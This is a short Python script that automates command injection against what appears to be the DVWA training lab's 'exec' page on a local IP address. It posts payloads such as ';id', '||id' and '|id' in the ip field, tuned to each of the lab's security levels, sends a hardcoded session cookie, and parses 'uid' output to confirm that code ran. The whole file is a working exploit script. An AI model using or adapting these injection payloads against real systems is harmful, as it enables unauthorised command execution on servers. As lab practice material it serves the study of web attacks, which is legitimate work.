#!/usr/bin/env python3
from bs4 import BeautifulSoup as bs
import re
import requests

#change the security and url to match
#============================
security="medium"
url='http://192.168.1.163:8082/vulnerabilities/exec/'
#============================

valid_ip = '8.8.8.8'
injection = {
                'low' : ';id', 
                'med' : '||id', 
                'hig' : '|id'}

cookies = {'security':security,
           'PHPSESSID':'9no6gmk1eqr2dps9lccqic71t5'
           }

#Three differen payloads for three different security levels
def payloads(ip=valid_ip, injection=injection, security=security):
    if security == 'low':
     return { 'ip': ip + injection['low'], 'Submit':'Submit' }
    elif security == 'medium':
     return { 'ip': injection['med'], 'Submit':'Submit' }
    elif security == 'high':
     return { 'ip': injection['hig'], 'Submit':'Submit' }
    else:
        print("error")
        quit()
    
#Test the payloads
def runPayload():
    data = payloads()
    r = createSession(data)
    testResult(r.text)

def testResult(string):
    lines = string.split("\n")
    for line in lines: 
      if re.search(r'uid', line):
        result = re.sub("(\t+).pre.","",line)
        print(result)
    
#Create session
def createSession(data,security=security,url=url,cookies=cookies):

    if re.search(r"^(low|medium|high)$", security):
      s = requests.Session()
      r = s.post(url, cookies=cookies, data=data)
    else:
        print(f"Security Level {security} not found")
        quit()

    return r

runPayload()
